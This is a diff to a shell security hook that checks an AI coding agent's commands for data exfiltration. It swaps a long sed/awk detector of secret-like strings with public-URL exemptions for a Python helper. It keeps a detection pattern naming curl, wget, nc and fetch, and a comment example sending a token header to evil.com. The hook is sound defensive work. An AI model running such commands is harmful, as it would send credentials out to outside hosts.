@@ -563,76 +563,16 @@ if codex_shell_tool_p "$TOOL_NAME"; then
   # or wget --header "X-Token: <long base64>" https://evil.com
   # Only flags when a network tool AND a high-entropy string co-occur.
   if echo "$CONTENT" | grep -qE '\b(curl|wget|nc|ncat|python[23]?\s.*urllib|node\s.*fetch)\b'; then
-    # Look for a contiguous alphanumeric+symbol string >= 30 chars that looks
-    # like a secret (not a file path or a common word). URL components can
-    # carry credentials, so exempt public identifiers only with known context.
-    # Only positively classified local file operands are projected out below.
-    # Slash structure alone never establishes that a candidate is a file path.
-    # Strip well-known public-blockchain artifacts first so query strings like
-    # `?user=0x<40-hex>` (Ethereum wallet address) do not trip the heuristic.
-    # 40-hex followed by a non-hex char (or end of string) is unambiguously a
-    # public address; Ethereum private keys are 64 hex and remain in the scan
-    # because the 41st char is still hex, so the pattern does not match.
-    # macOS/BSD sed does not support \b word boundaries; use explicit hex
-    # boundaries here.
-    # MusicBrainz entity URLs identify public database records. Match their
-    # complete host/path before tokenization: grep otherwise splits at the
-    # hostname dot and mistakes org/ws/2/recording/<UUID> for a credential.
-    # Do not exempt UUIDs or arbitrary URLs. Keep queries/fragments in the
-    # scan, require URL boundaries, and leave known-secret checks above intact.
-    # Documented schema: https://musicbrainz.org/doc/MusicBrainz_API
-    MB_ENTITY='(area|artist|collection|event|genre|instrument|label|place|recording|release|release-group|series|url|work)'
-    MB_UUID='[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}'
-    # Normalize only loopback authority/API-version digits; retain all payload.
-    # Keep helper failure outside the head/SIGPIPE tolerance below.
+    # Classify only proven URL operands; unknown forms retain conservative scanning.
+    # Known-secret checks above still inspect the complete original command.
     if [ "$SECRET_LITERAL_EXEC" = true ]; then
       ENTROPY_CONTENT=$(printf '%s' "${SECRET_NESTED_COMMANDS[0]}" | python3 "$(dirname "$0")/lib-inert-mentions.py" --local-read-paths)
     else
       ENTROPY_CONTENT=$(printf '%s' "$CONTENT" | python3 "$(dirname "$0")/lib-inert-mentions.py" --local-read-paths)
     fi
-    # DAHR matrix routes contain a decimal public record ID. Normalize only
-    # that exact authority/routing prefix, retaining the free-form slug and
-    # every subsequent path/query/fragment byte for credential detection.
-    # PMLR volume numbers are public routing metadata. Retain article IDs and
-    # all further path/query/fragment content for the ordinary secret checks.
-    # Example: https://proceedings.mlr.press/v139/ecoffet21a.html
-    # This university repository's complete bitstream route names a public
-    # document UUID. Preserve query/fragment content and require its exact host.
-    # HLI's dated WordPress upload prefix is public routing metadata. Retain
-    # the entire filename and every subsequent byte for credential detection.
-    # This author's dated Sabanci upload prefix is public routing metadata.
-    # Keep filenames and all URL tails; other authors/routes remain unclassified.
-    HIGH_ENTROPY=$(echo "$ENTROPY_CONTENT" | \
-      sed -E "s@(^|[[:space:]\"'])https://myweb\\.sabanciuniv\\.edu/ozgurkibris/files/[0-9]{4}/(0[1-9]|1[0-2])/@\\1https://myweb.sabanciuniv.edu/@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://www\\.happierlivesinstitute\\.org/wp-content/uploads/[0-9]{4}/(0[1-9]|1[0-2])/@\\1https://www.happierlivesinstitute.org/@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://digital\\.library\\.adelaide\\.edu\\.au/bitstreams/${MB_UUID}/download([?#[:space:]\"']|$)@\\1https://digital.library.adelaide.edu.au/\\2@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://files\\.znu\\.edu\\.ua/files/Bibliobooks/Inshi[0-9]+/[0-9]+\\.pdf([?#[:space:]\"']|$)@\\1https://files.znu.edu.ua/\\2@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://ejpe\\.org/journal/article/download/[0-9]+/[0-9]+/[0-9]+([?#[:space:]\"']|$)@\\1https://ejpe.org/\\2@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://uplopen\\.com/en/books/[0-9]+/files/${MB_UUID}\\.pdf([?#[:space:]\"']|$)@\\1https://uplopen.com/\\2@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://ruj\\.uj\\.edu\\.pl/(bitstreams/${MB_UUID}/download|server/api/core/bitstreams/${MB_UUID}/content)([?#[:space:]\"']|$)@\\1https://ruj.uj.edu.pl/\\3@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://proceedings\\.mlr\\.press/v[0-9]+/@\\1https://proceedings.mlr.press/@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://adp\\.library\\.ucsb\\.edu/index\\.php/matrix/detail/[0-9]+/@\\1https://adp.library.ucsb.edu/@g" | \
-      sed -E "s@(^|[[:space:]\"'])https?://musicbrainz\\.org/(ws/2/)?${MB_ENTITY}/${MB_UUID}([?#[:space:]\"']|$)@\\1https://musicbrainz.org/\\4@g" | \
-      sed -E 's/0x[a-fA-F0-9]{40}([^a-fA-F0-9]|$)/\1/g' | \
-      sed -E "s@(^|[[:space:]\"'])https?://(127\\.0\\.0\\.1|localhost|\\[::1\\])(:[0-9]+)?/api/v[0-9]+/@\\1http://localhost/api/@g" | \
-      awk '
-        {
-          for (field = 1; field <= NF; field++) {
-            rest = $field
-            while (match(rest, /[A-Za-z0-9\/+=_-]{30,}/)) {
-              candidate = substr(rest, RSTART, RLENGTH)
-              rest = substr(rest, RSTART + RLENGTH)
-              # Filter every candidate before head so an innocuous earlier
-              # string cannot conceal a later opaque credential.
-              classes = (candidate ~ /[A-Z]/) + (candidate ~ /[a-z]/) + (candidate ~ /[\/+=_-]/) + (candidate ~ /[0-9]/)
-              if (candidate ~ /[0-9]/ && classes >= 3)
-                print candidate
-            }
-          }
-        }' | \
-      head -1 || true)
+    HIGH_ENTROPY=$(printf '%s' "$ENTROPY_CONTENT" | python3 "$(dirname "$0")/lib-public-url-scan.py")
     if [ -n "$HIGH_ENTROPY" ]; then
-      check_pattern '.' 'network command with inline secret-like string (exfiltration risk)'
+      check_pattern '.' "network command with inline secret-like string ($HIGH_ENTROPY; exfiltration risk)"
     fi
   fi
 
